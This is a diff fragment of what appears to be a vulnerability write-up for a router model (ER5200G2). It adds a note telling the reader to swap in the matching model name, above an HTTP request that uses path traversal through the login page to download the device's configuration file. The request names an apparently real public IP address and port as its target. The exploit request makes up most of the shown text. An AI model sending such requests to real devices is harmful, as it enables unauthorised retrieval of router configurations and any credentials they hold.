@@ -14,6 +14,8 @@
 
 **exp**:
 
+**Note**:The ER5200G2 in the url needs to be changed to the corresponding model
+
 ```http
 GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
 Host: 58.221.11.74:12345
